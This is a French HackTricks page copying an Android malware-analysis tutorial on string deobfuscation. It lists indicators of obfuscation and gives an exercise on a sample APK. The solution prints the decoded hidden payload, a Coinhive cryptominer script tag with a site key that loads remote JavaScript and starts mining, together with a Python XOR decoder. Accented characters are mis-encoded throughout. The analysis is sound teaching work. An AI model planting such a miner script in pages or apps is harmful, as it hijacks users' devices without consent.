<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Copi√© depuis **[**https://maddiestone.github.io/AndroidAppRE/obfuscation.html**](https://maddiestone.github.io/AndroidAppRE/obfuscation.html)** (vous pouvez trouver des solutions l√†-bas)**

![Logo](https://maddiestone.github.io/AndroidAppRE/images/pinkandroid.png)

Il y a de nombreuses fois o√π l'application que vous analysez ne sera pas aussi claire que certains des exemples que nous avons discut√©s. Le d√©veloppeur mettra en ≈ìuvre une ou plusieurs techniques d'obfuscation pour cacher le comportement et/ou l'impl√©mentation de leur application. Cela peut √™tre pour des raisons √† la fois b√©nignes et malveillantes.

L'essentiel √† retenir sur l'obfuscation est que si vous souhaitez la d√©sobfusquer, vous le pourrez. La d√©cision cl√© n'est pas de savoir si vous pouvez ou non, mais si cela vaut les ressources pour d√©sobfusquer.

La raison pour laquelle vous pouvez toujours d√©sobfusquer quelque chose est que, en fin de compte, le CPU doit √† un moment donn√© voir le code non obfusqu√© afin de l'ex√©cuter.

## Comment D√©sobfusquer <a href="how-to-de-obfuscate" id="how-to-de-obfuscate"></a>

La mani√®re dont vous choisissez de d√©sobfusquer l'application d√©pendra de la m√©thode d'obfuscation, mais il existe quelques techniques courantes qui fonctionnent g√©n√©ralement bien. Ici, nous ne parlerons que des techniques de d√©sobfuscation statiques puisque cet atelier ne couvre que l'analyse/reverse statique. Cependant, n'oubliez pas que l'ex√©cution de l'application et son analyse dynamique peuvent √™tre un autre excellent moyen de contourner l'obfuscation.

Pour l'obfuscation dans le bytecode DEX (Java), l'un des moyens les plus simples de d√©sobfusquer statiquement est d'identifier les m√©thodes de d√©sobfuscation dans l'application et de copier leur d√©compilation dans un fichier Java que vous ex√©cutez ensuite sur le fichier, les cha√Ænes, le code, etc. obfusqu√©s.

Une autre solution pour le code Java et Natif est de translitt√©rer l'algorithme de d√©sobfuscation en Python ou tout autre langage de script avec lequel vous √™tes le plus √† l'aise. Je dis "translitt√©rer" car il est important de se rappeler que vous n'avez pas toujours besoin de *comprendre* l'algorithme de d√©sobfuscation, vous avez juste besoin d'un moyen de l'ex√©cuter. Je couvre cela plus en d√©tail dans la conf√©rence "Unpacking the Packed Unpacker" qui est li√©e dans la section "Plus d'exemples".

## Indicateurs d'Obfuscation <a href="indicators-of-obfuscation" id="indicators-of-obfuscation"></a>

Il existe de nombreux types diff√©rents d'obfuscation et donc, tout autant de types d'indicateurs pour alerter l'analyste qu'une application est probablement obfusqu√©e, mais voici quelques exemples avec des solutions d'analyse statique propos√©es pour d√©sobfusquer.

* Pas de cha√Ænes : Java et Android d√©pendent fortement des cha√Ænes de caract√®res donc si vous n'en voyez aucune ou seulement des cha√Ænes brouill√©es, il est tr√®s probable que les cha√Ænes soient obfusqu√©es.
* Solution sugg√©r√©e : Cherchez les appels de m√©thode qui prennent des cha√Ænes comme argument et remontez d'o√π vient cet argument. √Ä un moment donn√©, l'argument de la cha√Æne passera par une m√©thode de d√©sobfuscation avant d'√™tre transmis √† l'API qui prend l'argument String.
* Cha√Ænes brouill√©es : Les API Java et Android n√©cessitent les cha√Ænes en texte clair, pas brouill√©es.
* Solution sugg√©r√©e : Les cha√Ænes brouill√©es sont toutes probablement pass√©es aux m√™mes m√©thodes avant d'√™tre transmises aux API. Ces m√©thodes sont probablement les m√©thodes de d√©sobfuscation.
* Fichiers binaires dans le r√©pertoire assets/ et appels √† DexClassLoader dans l'application : Probablement d√©ballage et chargement de code suppl√©mentaire. (Peut √©galement √™tre t√©l√©chargement depuis un emplacement distant puis chargement √† l'aide de DexClassLoader)
* Solution sugg√©r√©e : Identifiez o√π le fichier est lu puis suivez le chemin. Il est probablement d√©sobfusqu√© peu apr√®s avoir √©t√© lu.
* Biblioth√®ques natives - Impossible d'identifier les fonctions JNI (pas de fonctions nomm√©es Java\_ et pas d'appels √† RegisterNatives) : Pour ex√©cuter des m√©thodes natives, JNI doit pouvoir associer la fonction dans la biblioth√®que native avec la d√©claration de m√©thode native en Java et donc l'un des deux doit exister √† un moment donn√©.
* Solution sugg√©r√©e : Commencez par la m√©thode JNI_OnLoad et cherchez une routine de d√©sobfuscation qui charge du code suppl√©mentaire.

## Exercice 7 - D√©sobfuscation de Cha√Ænes <a href="exercise-7---string-deobfuscation" id="exercise-7---string-deobfuscation"></a>

Dans cet exercice, nous allons pratiquer la d√©sobfuscation de cha√Ænes afin d'analyser une application. Pour l'exercice, nous utiliserons l'√©chantillon √† `~/samples/ClashOfLights.apk` dans la VM. Cet √©chantillon a le digest SHA256 c403d2dcee37f80b6d51ebada18c409a9eae45416fe84cd0c1ea1d9897eae4e5.

### Objectifs <a href="goals" id="goals"></a>

Identifier les cha√Ænes obfusqu√©es et d√©velopper une solution pour les d√©sobfusquer.

### Contexte de l'Exercice <a href="exercise-context" id="exercise-context"></a>

Vous √™tes un analyste de logiciels malveillants examinant cette application pour d√©terminer si c'est un logiciel malveillant. Vous tombez sur une cha√Æne Javascript obfusqu√©e qui est charg√©e et devez la d√©sobfusquer pour d√©terminer si l'application est malveillante ou non. Vous ne pouvez pas ex√©cuter l'application de mani√®re dynamique et devez d√©terminer ce que le Javascript est statiquement.

### Instructions <a href="instructions" id="instructions"></a>

1. Trouvez la cha√Æne que vous devez d√©sobfusquer
2. Identifiez la routine qui la d√©sobfusque.
3. D√©terminez comment vous souhaitez √©crire une solution pour d√©sobfusquer la cha√Æne.
4. Faites-le :)

### Solution <a href="solution" id="solution"></a>

La cha√Æne d√©sobfusqu√©e est :
```
<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
```
Le script Python que j'ai √©crit pour le d√©sobfusquer est :
```
enc_str = "773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D393B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"

length = len(enc_str)
count = 0
dec_str = [0] * (length/2)
while (count < length):
dec_str[count/2] = (int(enc_str[count], 16) << 4) + int(enc_str[count + 1], 16) & 0xFF
count += 2
print dec_str


key = [75, 67, 81, 82, 49, 57, 84, 90]
enc_str = dec_str
count = 0
length = len(enc_str)
while (count < length):
dec_str[count] = chr(enc_str[count] ^ key[count % len(key)])
count += 1
print ''.join(dec_str)
```
## Plus d'exemples <a href="more-examples" id="more-examples"></a>

J'ai donn√© plusieurs conf√©rences sur la d√©sobfuscation d'applications Android qui incluent une vari√©t√© de m√©canismes d'obfuscation. Dans ces conf√©rences, je discute des techniques d'obfuscation avanc√©es, de ma solution pour les d√©sobfusquer, et des consid√©rations et choix que j'ai faits en d√©cidant comment je voulais d√©sobfusquer.

* BlackHat USA 2018 : "Unpacking the Packed Unpacker: Reverse Engineering an Android Anti-Analysis Library" \[[vid√©o](https://www.youtube.com/watch?v=s0Tqi7fuOSU)]
* Cette conf√©rence aborde le reverse engineering de l'une des biblioth√®ques natives anti-analyse les plus complexes que j'ai vues utilis√©es par une application Android. Elle couvre principalement les techniques d'obfuscation dans le code natif.
* REcon 2019 : "The Path to the Payload: Android Edition" \[[vid√©o](https://recon.cx/media-archive/2019/Session.005.Maddie_Stone.The_path_to_the_payload_Android_Edition-J3ZnNl2GYjEfa.mp4)]
* Cette conf√©rence discute d'une s√©rie de techniques d'obfuscation, uniquement dans le code Java, qu'un botnet Android utilisait pour cacher son comportement.


<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
